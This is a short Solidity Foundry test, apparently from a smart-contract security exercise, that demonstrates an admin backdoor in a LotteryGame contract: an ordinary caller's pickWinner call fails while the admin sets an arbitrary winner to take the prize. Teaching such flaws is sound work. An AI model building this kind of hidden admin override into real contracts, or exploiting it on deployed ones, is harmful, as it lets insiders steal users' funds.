// SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Backdoor-assembly.sol";

contract LotteryGameExploit is Test {
    LotteryGame LotteryGameContract;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    function setUp() external {
        LotteryGameContract = new LotteryGame();
    }

    function testBackDoorCall() external {
        console.log("Alice performs pickWinner, of course she will not win");
        vm.prank(alice);
        LotteryGameContract.pickWinner(address(alice));
        console.log("Lottery Prize: ", LotteryGameContract.PRIZE());

        console.log("Now, Admin sets the winner to drain out the prize");
        LotteryGameContract.pickWinner(address(bob));
        assertEq(LotteryGameContract.winner(), address(bob));
        console.log("Admin manipulated winner: ", LotteryGameContract.winner());
        console.log("Exploit completed");
    }

    receive() external payable {}
}
